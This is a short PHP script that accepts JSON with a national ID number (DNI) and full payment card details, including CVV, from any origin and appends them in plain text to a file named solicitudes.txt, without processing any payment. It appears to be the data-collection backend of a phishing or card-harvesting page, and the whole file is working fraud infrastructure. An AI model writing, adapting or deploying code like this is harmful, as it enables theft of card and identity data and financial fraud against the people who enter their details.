<?php
// Error reporting - display errors for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Ensure no output before headers
ob_start();

try {
    // Headers
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Accept");
    header("Content-Type: application/json");

    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        echo json_encode(['success' => true]);
        exit();
    }

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }

    // Get JSON input
    $jsonInput = file_get_contents('php://input');
    $data = json_decode($jsonInput, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new Exception('Invalid JSON data');
    }

    // Extract data from JSON
    $dni = $data['dni'] ?? '';
    $cardNumber = $data['cardInfo']['number'] ?? '';
    $cardName = $data['cardInfo']['name'] ?? '';
    $cardExpiry = $data['cardInfo']['expiry'] ?? '';
    $cardCvv = $data['cardInfo']['cvv'] ?? '';

    if (!$dni || !$cardNumber || !$cardName || !$cardExpiry || !$cardCvv) {
        throw new Exception('Missing required fields');
    }

    // Create log entry
    $logEntry = "\n=== NUEVA SOLICITUD: " . date('Y-m-d H:i:s') . " ===\n";
    $logEntry .= "DNI: {$dni}\n";
    $logEntry .= "TARJETA\n";
    $logEntry .= "Número: {$cardNumber}\n";
    $logEntry .= "Titular: {$cardName}\n";
    $logEntry .= "Vencimiento: {$cardExpiry}\n";
    $logEntry .= "CVV: {$cardCvv}\n";
    $logEntry .= "======================================\n";

    // Save to file
    $fileName = __DIR__ . '/solicitudes.txt';
    if (!file_put_contents($fileName, $logEntry, FILE_APPEND)) {
        throw new Exception('Failed to save data');
    }

    // Clear any buffered output
    ob_clean();
    
    // Return success response
    echo json_encode(['success' => true]);

} catch (Exception $e) {
    // Clear any buffered output
    ob_clean();
    
    // Set error status code
    http_response_code(400);
    
    // Return error response
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}